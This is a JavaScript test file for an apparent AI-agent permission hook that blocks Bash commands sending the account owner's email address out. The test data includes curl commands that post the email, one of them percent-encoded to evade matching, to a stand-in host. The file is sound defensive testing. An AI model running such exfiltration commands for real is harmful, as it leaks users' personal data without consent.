const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

test('account-email privacy denial is scoped and follows the live approval mode', async () => {
  const { isAccountEmailRequest, run, MESSAGE } = await import('../../claude/hooks/privacy-permission-hook.mjs');
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'privacy-permission-'));
  fs.writeFileSync(path.join(home, '.claude.json'), JSON.stringify({ oauthAccount: { emailAddress: 'owner@example.com' } }));
  const payload = { hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command: 'curl https://example.com --data owner%40example.com' } };
  const env = { HOME: home, AGENTHUB_MODE: 'interactive', AGENTHUB_CALLBACK_URL: 'http://example.com', AGENTHUB_CALLBACK_TOKEN: 'synthetic' };
  try {
    assert.equal(isAccountEmailRequest(payload, 'owner@example.com'), true);
    assert.equal(isAccountEmailRequest({ ...payload, tool_input: { command: 'curl https://example.com --data %4Fwner%40example.com' } }, 'owner@example.com'), true);
    for (const command of ['echo owner@example.com', 'curl https://example.com --data other@example.com'])
      assert.equal(isAccountEmailRequest({ ...payload, tool_input: { command } }, 'owner@example.com'), false);
    assert.equal(isAccountEmailRequest({ ...payload, tool_name: 'Read' }, 'owner@example.com'), false);
    let calls = 0;
    const callback = decision => async (_, options) => {
      calls++;
      assert.deepEqual(JSON.parse(options.body), { tool: 'Bash', kind: 'account-email' });
      return { ok: true, json: async () => ({ decision }) };
    };
    const denied = await run(payload, env, callback('deny'));
    assert.deepEqual(denied.hookSpecificOutput.decision, { behavior: 'deny', message: MESSAGE });
    assert.equal(await run(payload, { ...env, AGENTHUB_AUTO_APPROVE: '1' }, callback('ask')), null);
    assert.equal(await run({ ...payload, tool_name: 'Read' }, env, callback('deny')), null);
    assert.equal(calls, 2);
    assert.equal((await run(payload, { HOME: home, AGENTHUB_MODE: 'autonomous' })).hookSpecificOutput.decision.behavior, 'deny');
    assert.equal(await run(payload, { HOME: home }), null);
  } finally { fs.rmSync(home, { recursive: true, force: true }); }
});
